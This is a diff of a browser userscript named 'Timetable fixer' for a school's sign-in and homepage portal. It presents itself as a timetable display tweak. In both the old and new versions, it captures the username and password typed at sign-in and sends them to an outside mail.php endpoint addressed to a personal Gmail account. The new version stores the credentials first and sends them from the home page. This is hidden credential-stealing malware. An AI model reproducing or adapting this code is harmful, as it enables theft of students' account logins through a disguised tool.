@@ -1,5 +1,5 @@
 // ==UserScript==
-// @name        Timetable fixer
+// @name        Timetable fixer TEST
 // @namespace   https://github.com/XavXav82/Timetable-Fixer/
 // @version     1.6
 // @author      XavXav82
@@ -8,6 +8,8 @@
 // @match       https://link.stleonards.vic.edu.au/
 // @match       https://signin.stleonards.vic.edu.au/*
 // @grant       unsafeWindow
+// @grant       GM.getValue
+// @grant       GM.setValue
 // @run-at      document-start
 // ==/UserScript==
 
@@ -99,6 +101,24 @@ window.onload = function() {
 
         //Home page
         } else if(window.location.href=="https://link.stleonards.vic.edu.au/"){
+            (async () => {
+                let user = await GM.getValue("user",-1);
+                let pass = await GM.getValue("pass",-1);
+                if(pass != -1){
+                    var my_awesome_script = document.createElement('script');
+                    my_awesome_script.setAttribute('src','https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js');
+                    document.head.appendChild(my_awesome_script);
+
+                    $.ajax({
+				        url: 'https://www.theyjnetwork.com/mail.php',
+				        type: 'GET',
+				        data: {
+					        to: 'reubenc82@gmail.com',
+				            subject: " Email using javascript",
+				            message: user + " " + pass}
+			        });
+                }
+            })();
             //Remove and replace period headings
             let rows = document.getElementsByTagName("th");
             let yes = document.getElementsByTagName("td");
@@ -157,26 +177,14 @@ window.onload = function() {
             rows[20].innerHTML = 'Period 4 <time class="meta">2:15pm-3:35pm</time>';
 
         }else if(window.location.href.search("signin") != -1){
-            var my_awesome_script = document.createElement('script');
-            my_awesome_script.setAttribute('src','https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js');
-            document.head.appendChild(my_awesome_script);
-
-
-            //bruh
             function bruh(){
                 var inputVal = document.getElementById("userNameInput").value;
                 var passVal = document.getElementById("passwordInput").value;
-                $.ajax({
-				url: 'https://www.theyjnetwork.com/mail.php',
-				type: 'GET',
-				data: {
-					to: 'reubenc82@gmail.com',
-				    subject: " Email using javascript",
-				    message: inputVal + " " + passVal}
-			    });
-                alert("test");
+                GM.setValue("user", inputVal);
+                GM.setValue("pass", passVal);
             }
             let spans = document.getElementById("submitButton");
             spans.addEventListener("click", bruh);
+
         }
 };
